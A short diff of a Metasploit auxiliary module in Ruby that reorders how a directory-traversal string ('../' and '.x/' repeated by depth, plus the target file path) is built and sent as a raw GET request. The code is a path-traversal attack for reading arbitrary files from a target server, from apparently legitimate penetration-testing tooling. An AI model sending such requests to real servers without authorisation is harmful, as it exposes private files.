@@ -42,13 +42,13 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    traversal = "../" * datastore['DEPTH'] << ".x/" * datastore['DEPTH']
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ /^\//
+    traversal = "../" * datastore['DEPTH'] << ".x/" * datastore['DEPTH'] << filename
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "#{traversal}#{filename}"
+      'uri'    => "#{traversal}"
     })
 
     if res &&
